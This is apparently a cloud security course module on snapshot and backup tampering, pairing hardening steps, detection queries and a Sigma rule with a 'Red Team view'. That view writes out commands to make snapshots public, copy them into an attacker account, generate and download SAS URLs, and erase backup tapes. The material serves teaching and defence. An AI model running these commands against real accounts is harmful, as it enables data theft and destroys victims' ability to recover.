# 05 — Snapshots & Backup Tampering

> **Level:** Intermediate
> **Prereqs:** [04-02 — Public Exposure & Block Public Access](./public-exposure-and-block-public.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Impact (Data Destruction, Inhibit System Recovery)
> **Authorization scope:** Run only against your own storage accounts / a dedicated sandbox bucket.

## What & why

Snapshots are point-in-time copies of block volumes (EBS, Azure Disk, Persistent Disk) and managed database instances. An attacker who compromises compute or storage credentials can delete snapshots, share them publicly, or restore them to an attacker-controlled account — destroying recovery capability without touching the production bucket or database.

## The OnPrem reality

Backup tape libraries with write-protect tabs, checked out by an operator and stored offsite. The operator's badge and physical custody log were the access controls. An insider with building access could simply walk the tape to a different shelf or "accidentally" degauss it. The cloud equivalent is far faster: a single API call.

```bash
# OnPrem: destroying a tape backup (requires physical access)
mt -f /dev/nst0 rewind
mt -f /dev/nst0 erase
```

## Core concepts

| Cloud | Snapshot service | Volume service | Delete protection | Public share risk | Vault lock |
|---|---|---|---|---|---|
| AWS | EBS Snapshots | EBS | `DeleteSnapshot` IAM; Recycle Bin | `ModifySnapshotAttribute` (share with other accounts / make public) | AWS Backup Vault Lock |
| Azure | Azure Disk Snapshots / Backup | Managed Disks | Azure Backup soft-delete (14d default); Resource Locks | SAS URL for snapshot (granting read to public) | Backup Vault soft-delete + MUA |
| GCP | Persistent Disk Snapshots | Persistent Disk | No native delete protection; IAM only | `compute.snapshots.setIamPolicy` (allAuthenticatedUsers) | > (as of June 2026, GCP does not have a native backup vault lock equivalent; retention is managed via IAM and snapshot lifecycle policies) |
| OnPrem | Tape / disk-to-disk | Physical HDD | Write-protect tab | Physical custody | Offsite vault |

## AWS

**Service:** EBS Snapshots + AWS Backup. **Console path:** `EC2 → Snapshots` / `AWS Backup → Backup vaults`.

```bash
# 1. Create snapshot of a volume
aws ec2 create-snapshot \
  --volume-id vol-00000000000000000 \
  --description "Pre-patch snapshot"

# 2. Enable Recycle Bin for accidental deletion recovery
aws ec2 create-recycle-bin-rule \
  --retention-period 7 \
  --resource-type snapshot

# 3. Create AWS Backup Vault with Vault Lock (deny deletes)
aws backup create-backup-vault \
  --backup-vault-name critical-backups

aws backup put-backup-vault-lock-configuration \
  --backup-vault-name critical-backups \
  --min-retention-days 90 \
  --max-retention-days 365 \
  --changeable-for-days 0
```

**Terraform:**
```hcl
resource "aws_ebs_snapshot" "pre_patch" {
  volume_id   = "vol-00000000000000000"
  description = "Pre-patch snapshot"
}

resource "aws_backup_vault_lock_configuration" "critical" {
  backup_vault_name = "critical-backups"
  min_retention_days = 90
  max_retention_days = 365
}
```

**Gotcha:** EBS snapshots are incremental in the backend (you're billed only for changed blocks), but the snapshot API treats each as an independent restore point. Deleting a snapshot that other snapshots depend on does not break them — the backend retains referenced blocks. Snapshot sharing with another account is a single API call, and if that account is attacker-controlled, data is exfiltrated instantly.

## Azure

**Service:** Azure Backup + Resource Locks. **Console path:** `Recovery Services vaults → <vault> → Backup Items`.

```bash
# 1. Enable soft-delete for Azure Backup (14 days default)
az backup vault backup-properties set \
  --name backup-vault-lab \
  --resource-group rg-security-lab \
  --soft-delete-feature-state Enabled \
  --soft-delete-retention-duration 14

# 2. Apply resource lock to backup vault (prevent deletion)
az lock create \
  --name "backup-vault-no-delete" \
  --lock-type CanNotDelete \
  --resource-group rg-security-lab \
  --resource backup-vault-lab \
  --resource-type "Microsoft.DataProtection/BackupVaults"

# 3. Create disk snapshot with incremental type
az snapshot create \
  --resource-group rg-security-lab \
  --name pre-patch-snapshot \
  --source "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-security-lab/providers/Microsoft.Compute/disks/lab-disk" \
  --incremental true
```

**Terraform:**
```hcl
resource "azurerm_management_lock" "backup_vault" {
  name       = "backup-vault-no-delete"
  scope      = azurerm_data_protection_backup_vault.lab.id
  lock_level = "CanNotDelete"
}
```

**Gotcha:** Azure Disk snapshots support incremental snapshots for cost savings. However, a snapshot's SAS URL — if generated and leaked — provides anonymous read access to the full disk image. Treat snapshot SAS URLs with the same caution as storage SAS tokens.

## GCP

**Service:** Persistent Disk Snapshots. **Console path:** `Compute Engine → Snapshots`.

```bash
# 1. Create snapshot
gcloud compute snapshots create pre-patch-snapshot \
  --source-disk=lab-disk \
  --source-disk-zone=us-east1-b

# 2. Set IAM on snapshot (restrict to specific principals)
gcloud compute snapshots add-iam-policy-binding pre-patch-snapshot \
  --member=serviceAccount:backup-sa@example-project.iam.gserviceaccount.com \
  --role=roles/compute.storageAdmin

# 3. Apply org policy: deny snapshot IAM grants to allAuthenticatedUsers
# (enforced via Organization Policy constraints)
```

**Terraform:**
```hcl
resource "google_compute_snapshot" "pre_patch" {
  name        = "pre-patch-snapshot"
  source_disk = google_compute_disk.lab.id
  zone        = "us-east1-b"
}
```

**Gotcha:** GCP snapshots are multi-regional in storage (stored in the closest multi-region). IAM on snapshots controls who can create disks from them — granting `roles/compute.storageAdmin` to the wrong principal enables full restore-to-any-project exfiltration.

## OnPrem mapping

| Concern | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Snapshot primitive | Tape/D2D | EBS Snapshot | Disk Snapshot | PD Snapshot |
| Delete protection | Write-protect tab | Recycle Bin + Vault Lock | Soft-delete + Resource Lock | IAM-only |
| Public share prevention | Physical vault door | IAM: deny `ModifySnapshotAttribute` group=all | Deny SAS URL generation | IAM: deny `allAuthenticatedUsers` |
| Cross-account restore | Transport tape to another site | `ModifySnapshotAttribute` + shared snapshot | Disk export to SAS URL in another subscription | IAM grant to another project |
| Audit | Custody log | CloudTrail `CreateSnapshot`, `DeleteSnapshot`, `ModifySnapshotAttribute` | Activity Log `Write Snapshots` | Cloud Audit Logs `compute.snapshots.insert`, `delete`, `setIamPolicy` |

## 🔴 Red Team view

An attacker who compromises `ec2:ModifySnapshotAttribute` can silently exfiltrate disk snapshots:

```bash
# Attacker enumerates available snapshots
aws ec2 describe-snapshots \
  --owner-ids 111111111111 \
  --query "Snapshots[?StartTime > '2026-06-01'].{Id:SnapshotId, Desc:Description}"

# Attacker marks a snapshot as public (contained — own snapshot)
aws ec2 modify-snapshot-attribute \
  --snapshot-id snap-00000000000000000 \
  --attribute createVolumePermission \
  --operation-type add \
  --group-names all

# Attacker in a separate account copies the snapshot
aws ec2 copy-snapshot \
  --source-region us-east-1 \
  --source-snapshot-id snap-00000000000000000 \
  --destination-region eu-west-1 \
  --description "Exfiltrated snapshot"

# Attacker creates a volume from the exfiltrated snapshot in their own account
aws ec2 create-volume \
  --availability-zone eu-west-1a \
  --snapshot-id snap-00000000000000000

# Attacker cleans up: remove public permission
aws ec2 modify-snapshot-attribute \
  --snapshot-id snap-00000000000000000 \
  --attribute createVolumePermission \
  --operation-type remove \
  --group-names all
```

**Azure equivalent:**
```bash
# Attacker generates SAS URL for snapshot
az snapshot grant-access \
  --resource-group rg-security-lab \
  --name pre-patch-snapshot \
  --duration-in-seconds 3600 \
  --access-level Read

# Downloads snapshot to attacker-controlled environment
azcopy copy "<SAS_URL>" "/tmp/exfiltrated.vhd"
```

**GCP equivalent:**
```bash
gcloud compute snapshots add-iam-policy-binding pre-patch-snapshot \
  --member=allAuthenticatedUsers \
  --role=roles/compute.viewer
```

**Artifacts left:** CloudTrail records `ModifySnapshotAttribute` with `createVolumePermission.add.items.group="all"`. Azure Activity Log records `Grant Access to Snapshot`. GCP Audit Logs records `compute.snapshots.setIamPolicy`. The snapshot copy event in the attacker's account creates a separate CloudTrail trail (not visible to the victim unless the attacker account is within the same organization and the org has a management trail).

## 🔵 Blue Team view

**Preventive controls:**
```bash
# AWS SCP: deny public sharing of snapshots
aws organizations create-policy \
  --name DenyPublicSnapshotShare \
  --type SERVICE_CONTROL_POLICY \
  --content '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":["ec2:ModifySnapshotAttribute"],"Resource":["*"],"Condition":{"StringEquals":{"ec2:CreateVolumePermission/group":"all"}}}]}'

# Azure Policy: deny snapshot public access grants
az policy definition create \
  --name audit-snapshot-sas \
  --rules '{"if":{"field":"type","equals":"Microsoft.Compute/snapshots"},"then":{"effect":"audit"}}'
```

**Detection queries:**
```sql
-- AWS CloudTrail: snapshot shared publicly
SELECT eventTime, sourceIPAddress, userIdentity.arn,
       requestParameters.snapshotId
FROM cloudtrail_logs
WHERE eventName = 'ModifySnapshotAttribute'
  AND requestParameters.createVolumePermission.add.items.group = 'all'

-- AWS CloudTrail: bulk snapshot deletion
SELECT userIdentity.arn, COUNT(*) as delete_count
FROM cloudtrail_logs
WHERE eventName = 'DeleteSnapshot'
  AND eventTime > now() - interval '15 minutes'
GROUP BY userIdentity.arn
HAVING COUNT(*) > 5
```

```kusto
// Azure: snapshot SAS URL generation
ActivityLog
| where OperationNameValue == "Microsoft.Compute/snapshots/beginGetAccess/action"
| project TimeGenerated, Caller, ResourceId
```

```sql
-- GCP: snapshot IAM modification for allAuthenticatedUsers
SELECT timestamp, protoPayload.authenticationInfo.principalEmail,
       resource.labels.snapshot_name
FROM `project-id.cloud_audit_logs._AllLogs`
WHERE protoPayload.methodName = "compute.snapshots.setIamPolicy"
  AND protoPayload.request.policy.bindings.members LIKE "%allAuthenticatedUsers%"
```

**Response:**
1. Immediately revoke snapshot share: `aws ec2 modify-snapshot-attribute --operation-type remove --group-names all` / `az snapshot revoke-access`.
2. Audit all snapshots created from the compromised snapshot in external accounts (AWS: check `describe-snapshots` with `restorable-by-user-ids`).
3. Rotate credentials for the principal that performed the share.
4. Enable AWS Backup Vault Lock or Azure Resource Locks on all backup vaults.

## Hands-on lab

1. Create a small disk/volume (1 GB) and attach it to a test instance.
2. Write a test file to the volume, take a snapshot.
3. Delete the test file from the volume.
4. Create a new volume from the snapshot and verify the file is restored.
5. Attempt to delete the snapshot — note the API call succeeds (no protection enabled in this lab).
6. Enable Recycle Bin (AWS) or soft-delete (Azure) and repeat — verify the snapshot is recoverable.
7. **Teardown:** Delete test volumes, snapshots, and backup vaults.

**Expected output:** File restored from snapshot. Deletion without protection succeeds; deletion with protection allows recovery.

## Detection rules & checklists

```yaml
# Sigma rule — Cloud disk snapshot shared publicly
title: Cloud Disk Snapshot Shared Publicly
status: experimental
logsource:
  product: cloud
  service: block_storage
detection:
  selection_aws:
    eventName: ModifySnapshotAttribute
    requestParameters.createVolumePermission.add.items.group: 'all'
  selection_azure:
    OperationNameValue: 'Microsoft.Compute/snapshots/beginGetAccess/action'
    Properties.accessLevel: 'Read'
  selection_gcp:
    methodName: compute.snapshots.setIamPolicy
    members|contains: 'allAuthenticatedUsers'
  condition: selection_aws or selection_azure or selection_gcp
level: critical
```

```bash
# AWS: list all snapshots shared publicly or with external accounts
aws ec2 describe-snapshots \
  --owner-ids 111111111111 \
  --restorable-by-user-ids all \
  --query "Snapshots[].SnapshotId" --output table

# Azure: list snapshots with active SAS grants
az snapshot list --resource-group rg-security-lab \
  --query "[?diskState=='Unattached'].id" -o tsv

# GCP: check snapshot IAM bindings
gcloud compute snapshots list --format=json | jq '.[] | select(.name != null) | {name: .name, selfLink: .selfLink}'
```

## References

- [AWS Backup Vault Lock](https://docs.aws.amazon.com/aws-backup/latest/devguide/vault-lock.html)
- [Azure Backup soft delete](https://learn.microsoft.com/en-us/azure/backup/backup-azure-security-feature-cloud)
- [GCP Persistent Disk Snapshots](https://cloud.google.com/compute/docs/disks/create-snapshots)
- [MITRE ATT&CK T1490 — Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)
- Cross-ref: [04-04 — Object Lock & WORM](./object-lock-and-worm.md) for the bucket-level equivalent
